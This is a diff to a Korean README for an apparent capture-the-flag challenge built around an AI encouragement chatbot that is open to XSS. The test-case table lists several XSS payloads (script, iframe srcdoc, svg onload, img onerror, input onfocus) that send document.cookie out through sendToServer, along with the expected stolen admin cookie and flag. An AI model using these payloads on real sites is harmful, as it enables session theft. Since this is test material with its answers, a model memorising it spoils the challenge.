@@ -97,15 +97,19 @@
 ## ✅ 테스트 케이스 예시
 | 입력 | 기대 응답 |
 |-----|-----|
-| `오늘도 고생했어` | 🤖 긍정적인 응원 메시지 |
-| `<script>alert(1)</script>` | ❌ 아무 일도 일어나지 않음 (단순 alert) |
-| `<script>sendToServer(document.cookie)</script>` | ✅ 쿠키 탈취 성공 → 인증 시 flag 노출 |
-| `admin_session=j대리_secret_cookie_12345` | ✅ 최종 플래그 |
-| `admin_session=wrong_cookie_123` | ❌ 잘못된 쿠키 정보입니다 |
+| `오늘도 고생했어` | 🤖 AI 응원 메시지: 오늘도 열심히 한 당신, 정말 대단해요! 🌟💪 |
+| `<script>alert(1)</script>` | ⚠️ XSS 스크립트가 실행되었지만 쿠키 탈취에는 실패했습니다. |
+| `<script>sendToServer(document.cookie)</script>` | 쿠키 탈취 성공! 획득한 쿠키: admin_session = J 대리_secret_cookie_12345 |
+| `<iframe srcdoc="<script>sendToServer(document.cookie)</script>"></iframe>` | 쿠키 탈취 성공! 획득한 쿠키: admin_session = J 대리_secret_cookie_12345 |
+| `<svg onload="sendToServer(document.cookie)"></svg>` | 쿠키 탈취 성공! 획득한 쿠키: admin_session = J 대리_secret_cookie_12345 |
+| `<input autofocus onfocus="sendToServer(document.cookie)">` | 쿠키 탈취 성공! 획득한 쿠키: admin_session = J 대리_secret_cookie_12345 |
+| `<img src="x" onerror="sendToServer(document.cookie)">` | 쿠키 탈취 성공! 획득한 쿠키: admin_session = J 대리_secret_cookie_12345 |
+| `admin_session=j대리_secret_cookie_12345` | 최종 플래그 |
+| `admin_session=wrong_cookie_123` | 잘못된 쿠키 정보입니다. 다시 시도해보세요. |
 
 <br>
 
-## 🧪 Flag 제출 방식
+## 🧪 정답 확인 방식
 
 사용자는 획득한 Flag를 다음과 같이 제출합니다:
 
@@ -127,3 +131,4 @@ flag{answer}
 * 불필요한 장황한 설명이나 부적절한 내용이 포함되지 않도록 주의해야 함
 
 * AI 응답이 시스템에 바로 노출되어 XSS 취약점이 될 수 있음을 고려해, 가능한 한 안전한 텍스트 생성에 중점을 두어야 함
+
